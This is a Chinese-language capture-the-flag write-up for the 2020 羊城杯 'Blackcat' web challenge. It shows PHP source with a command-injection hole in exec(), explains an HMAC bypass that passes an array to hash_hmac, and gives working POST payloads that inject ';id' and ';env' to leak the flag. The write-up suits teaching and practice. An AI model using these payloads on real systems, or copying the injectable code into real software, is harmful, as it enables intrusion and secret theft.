# \[羊城杯 2020]Blackcat

## \[羊城杯 2020]Blackcat

## 考点

* `hash_hmac()`函数对传入的数组进行哈希会返回`NULL`

## wp

mp3文件下载下来，在文件最后存着源码

```php
if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){
    die('谁！竟敢踩我一只耳的尾巴！');
}

$clandestine = getenv("clandestine");

if(isset($_POST['White-cat-monitor']))
    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);


$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);

if($hh !== $_POST['Black-Cat-Sheriff']){
    die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');
}

echo exec("nc".$_POST['One-ear']);
```

要POST参数`Black-Cat-Sheriff`、`One-ear`和`White-cat-monitor`

首先使用`hash_hmac()`函数对POST的`White-cat-monitor`进行哈希，PHP+哈希=数组，测试发现`hash_hmac()`函数对传入的数组进行哈希会返回`NULL`。

POST的`White-cat-monitor`数组，那`clandestine`就是NULL。在第二次`hash_hmac()`时就相当于`hash_hmac('sha256', $_POST['One-ear'])`，本地PHP运行就可以得到哈希值，绕过`if($hh !== $_POST['Black-Cat-Sheriff'])`判断。最后用分号闭合命令执行即可。

POST

```
Black-Cat-Sheriff=58dedd736c5af324a198c6c663e569df59691854d1f53d704bdbce40f1d139c1&One-ear=;id&White-cat-monitor[]=1
```

flag在env中

```
Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&One-ear=;env&White-cat-monitor[]=1
```
